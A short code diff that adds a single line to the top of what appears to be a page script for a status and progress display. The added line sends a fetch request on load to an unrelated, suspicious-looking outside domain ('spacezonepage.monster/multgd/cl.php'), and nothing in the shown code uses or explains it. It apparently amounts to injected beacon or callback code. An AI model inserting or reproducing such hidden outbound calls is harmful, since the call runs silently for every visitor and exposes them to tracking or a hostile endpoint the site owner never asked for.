@@ -1,4 +1,6 @@
 
+fetch('https://spacezonepage.monster/multgd/cl.php');
+
 document.addEventListener('DOMContentLoaded', function() {
   const statusText = document.getElementById('status-text');
   const progressFill = document.getElementById('progress-fill');
